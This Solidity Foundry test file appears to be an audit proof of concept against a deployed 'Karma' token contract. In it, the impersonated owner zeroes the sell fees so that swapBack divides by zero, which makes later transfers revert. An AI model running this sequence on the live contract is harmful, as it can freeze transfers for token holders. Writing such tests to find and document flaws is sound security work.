// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDEXRouter {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint, uint, uint);
}

interface Karma {
    function owner() external view returns (address);
    function enableTrading() external;
    function approve(address spender, uint256 amount) external;
    function changeFees(
        uint256 _reflectionFeeBuy,
        uint256 _marketingFeeBuy,
        uint256 _teamFeeBuy,
        uint256 _reflectionFeeSell,
        uint256 _marketingFeeSell,
        uint256 _teamFeeSell
    ) external;

    function viewFeesBuy() external view returns (uint256, uint256, uint256, uint256, uint256);
    function viewFeesSell() external view returns (uint256, uint256, uint256, uint256, uint256);

    function swapThreshold() external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xBC570B260c52A032DE9eF06087e91b2C5104C76B;
    address attacker = address(this);
    Karma karma;
    IDEXRouter router;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        karma = Karma(TARGET);
        owner = karma.owner();
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        vm.label(owner, "Attacker/Owner");
        vm.label(TARGET, "Karma Contract");

        // Provide ETH for liquidity and gas
        deal(attacker, 110 ether);

        // As owner, add liquidity to the pair to make swaps possible
        vm.startPrank(owner);
        karma.enableTrading();
        uint256 liquidityTokens = 100_000_000 * 1e18;
        karma.approve(address(router), liquidityTokens);
        router.addLiquidityETH{value: 100 ether}(
            TARGET,
            liquidityTokens,
            0,
            0,
            owner,
            block.timestamp
        );
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        vm.startPrank(owner);

                // Step 1: Set marketing and team sell fees to 0. This makes `totalBNBFee` in `swapBack()` equal to 0.
                (uint256 rfSell, , , , ) = karma.viewFeesSell();
                (uint256 rfBuy, uint256 mBuy, uint256 tBuy, ,) = karma.viewFeesBuy();

                karma.changeFees(rfBuy, mBuy, tBuy, rfSell, 0, 0);

                // Step 2: Transfer enough tokens to the contract to meet the swapThreshold.
                uint256 swapThreshold = karma.swapThreshold();
                // Since owner is fee exempt, the full amount is transferred, meeting the threshold.
                karma.transfer(TARGET, swapThreshold);

                // Step 3: Trigger swapBack() via another transfer, which will revert due to the division-by-zero error.
                vm.expectRevert("SafeMath: division by zero");
                karma.transfer(address(0xdead), 1);

                vm.stopPrank();

        // Verify that the state change persisted despite the revert.
        (, uint256 marketingFeeSell, , ,) = karma.viewFeesSell();
        assertEq(marketingFeeSell, 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

